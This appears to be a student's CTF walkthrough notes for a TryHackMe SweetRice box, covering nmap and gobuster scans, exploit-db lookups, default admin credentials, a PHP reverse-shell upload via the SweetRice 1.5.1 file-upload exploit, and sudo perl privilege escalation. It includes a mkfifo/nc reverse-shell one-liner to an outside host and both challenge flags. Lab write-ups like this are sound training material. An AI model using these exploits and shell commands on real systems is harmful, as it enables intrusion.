root@ip-10-201-70-213:~# nmap -A -T4 10.201.60.244 -oN initial.nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-23 20:05 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.60.244
Host is up (0.00060s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 16:FF:E7:11:CA:F7 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.60 ms 10.201.60.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.74 seconds

root@ip-10-201-88-228:~# gobuster dir -u http://10.201.60.244 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html, .json, .yaml, .txt, .xml, .js, .php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.60.244
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/content              (Status: 301) [Size: 316] [--> http://10.201.60.244/content/]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===========


went to /content and found 

<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0" name="viewport" id="viewport"/><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><title>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</title>
<title>SweetRice notice</title>
<script type="text/javascript" src="http://10.201.60.244/content/js/SweetRice.js"></script>
<style>
*{margin:0;}
body{font-family:"Microsoft YaHei",Verdana,Georgia,arial,sans-serif;}
.header{line-height:30px;font-size:20px;background-color:#444;box-shadow:0px 0px 2px 2px #444;color:#fafafa;padding:0px 10px;}
#div_foot{	background-color:#444;height:30px;	line-height:30px;	color:#fff;padding:0px 10px;}
#div_foot a{	color: #66CC00;	text-decoration: none;}
#div_foot a:hover{	color: #66CC00;	text-decoration: underline;}
.content{margin:0px 10px;}
.content h1{
	margin:20px 0px;
	font-size:22px;
}
.content div,.content p{margin-bottom:16px;}
</style>
</head>
<body>
<div class="header">SweetRice notice</div>
<div class="content">
<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox "Site close" to open your website.</p><p>More help at <a href="http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/">Tip for Basic CMS SweetRice installed</a></p></div>
<div id="div_foot">Powered by <a href="http://www.basic-cms.org">Basic-CMS.ORG</a> SweetRice.</div>
<script type="text/javascript">
<!--
	_().ready(function(){
		_('.content').css({'margin-top':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px','margin-bottom':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px'});
	});
	_(window).bind('resize',function(){
		_('.content').animate({'margin-top':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px','margin-bottom':((_.pageSize().windowHeight-60-_('.content').height())/2)+'px'});
	});
//-->
</script>
</body>
</html>

<script type="text/javascript" src="http://10.201.60.244/content/js/SweetRice.js"></script>

this enumerates the CMS system

https://www.exploit-db.com/exploits/40718

https://www.exploit-db.com/exploits/40716

http://ww25.basic-cms.org/?bpt=345&subid1=20251024-0714-366c-baf8-d95342be1586&rurl=http%3A%2F%2F10.201.60.244%2F&ch=1

there may be a SSRF in this link in the IP 

root@ip-10-201-78-158:~# gobuster dir -u http://10.201.50.69/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .js, .json, .php, .yaml, .xml, .txt, .md, .xml

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.                    (Status: 200) [Size: 2198]
/images               (Status: 301) [Size: 321] [--> http://10.201.50.69/content/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.201.50.69/content/js/]
/inc                  (Status: 301) [Size: 318] [--> http://10.201.50.69/content/inc/]
/as                   (Status: 301) [Size: 317] [--> http://10.201.50.69/content/as/]
/_themes              (Status: 301) [Size: 322] [--> http://10.201.50.69/content/_themes/]
/attachment           (Status: 301) [Size: 325] [

it appears "as" is a login, "inc is an exposed directory with php code files", attachment is an empty directory

I DIDNT SEE IN THE IMAGE DIRECTORY

![[Pasted image 20251024084001.png]]

1.5.1, if we think back to our searchsploit search (I performed it earlier but didnt paste it because I didnt know if EDB would be useful)

root@ip-10-201-78-158:~# searchsploit sweetrice
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion       | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities    | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download     | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload       | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure           | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery  | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery  | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary Fil | php/webapps/14184.txt

---------------------------------------------- -------------------------


```py
 'user':username,
    'passwd':password,
    'rememberMe':''
}



with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
```

Okay, we clearly need creds before we get RCE here, let's google default sweetrice login first and snoop around if we can't find anything

I also dumped cache.db from /content/inc/cache

In SweetRice (and many PHP applications), `db_array_` indicates:

1. **Serialized PHP Arrays** - The cached data is PHP serialized arrays
    
2. **Database Result Caching** - These are cached SQL query results
    
3. **Configuration/Content Storage** - Site content, settings, menus, etc.

AI slop is informing me these COULD be cached queries which aren't crackable by rockyou however if the queries are single passwords we can pull off cracking

root@ip-10-201-78-158:~# john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

got me nowhere sooooooooooooooo screw that i'm not manually enumerating schema in sqlite3 all day, this is a basic CTF

obv there isnt a firewall rule blocking uncommon ports cuz this is a basic CTF

In an unpatched version of the SweetRice Content Management System (CMS), the default login for the administrative panel was `manager` with the password `Password123`. This credential combination was associated with a vulnerability discovered in version 1.5.1 of the software

I got this slop from AI so let's give it a wack

![[Pasted image 20251024094102.png]]

oh sweet lol proof of concept for creds

root@ip-10-201-78-158:~# git clone https://github.com/pentestmonkey/php-reverse-shell

obv edit IP param to my ens5 adapter

nc -lnvp 1234 

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.201.50.69
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : php-reverse-shell.php
root@ip-10-201-78-158:~# ls

```py
with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass  
```

well, it is obviously silent failing or not hitting any of these print statements below

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.201.50.69/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : php-reverse-shell.php
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.201.50.69/content/attachment/php-reverse-shell.php


![[Pasted image 20251024095459.png]]

Interesting to note the rev shell is shadowed

let's try editing the URL the way the script tells us to, couldnt get it to work

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.201.50.69/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : php-reverse-shell.php5
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.201.50.69/content/attachment/php-reverse-shell.php5
root@ip-10-201-78-158:~# 

AHA it doesnt accept .php extensions!

root@ip-10-201-78-158:~# nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.50.69 41036
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 16:58:18 up  1:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls  
bin
boot
cdrom



$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}

ok user flag

$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ 

-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl

They are unequivocally screwed we have passwordless backup .pl access and the PEARL BINARY. This really is a lazy admin

https://gtfobins.github.io/gtfobins/perl/

$ sudo perl -e 'exec "/bin/sh";'
sudo: no tty present and no askpass program specified

okay I dont have the right tty and the .py file I have all execute to doesnt have non root write perms so I should slow down and keep enumerating

$ cat mysql_login.txt
rice:randompass

Oh, this might be SQL but lets keep looking at stuff

$ head -n 20 backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ 

$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

oh, got it, they're cooked backup can run without password as sudo and backup runs a .sh, we just need to edit the bash script

$ echo 'system("/bin/bash");' > /home/itguy/backup.pl  

![[Pasted image 20251024102232.png]]

cd /root
ls
root.txt
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
